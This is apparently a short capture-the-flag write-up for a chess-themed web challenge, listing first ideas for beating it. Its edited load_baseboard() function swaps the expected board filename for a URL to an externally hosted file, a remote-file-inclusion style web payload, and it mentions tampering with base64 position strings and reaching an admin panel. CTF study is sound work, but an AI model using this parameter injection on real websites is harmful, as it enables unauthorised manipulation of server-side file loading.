# Challenge 01

## Hint

A clean and fair game of chess. Careful though, this is not a game for grandmasters to win.

Hint: Don't make this game harder than it needs to be

https://hackerchess-web.h4ck.ctfcompetition.com/

-----

## Initial thoughts

- Use load_baseboard() to load a winning game position by using a url to a hosted fen file.

```javascript
// original
function load_baseboard() {
  const url = "load_board.php"
  let xhr = new XMLHttpRequest()
  const formData = new FormData();
  formData.append('filename', 'baseboard.fen')

  xhr.open('POST', url, true)
  xhr.send(formData);
  window.location.href = "index.php";
}

// edit
function load_baseboard() {
  const url = "load_board.php"
  let xhr = new XMLHttpRequest()
  const formData = new FormData();
  formData.append('filename', 'https://raw.githubusercontent.com/jc190/h4ck1ng-google-progress/master/EP000/Challenge-01/s-mate.fen')

  xhr.open('POST', url, true)
  xhr.send(formData);
}
```
- Manipulate the base64 string for positions

- Log into admin panel

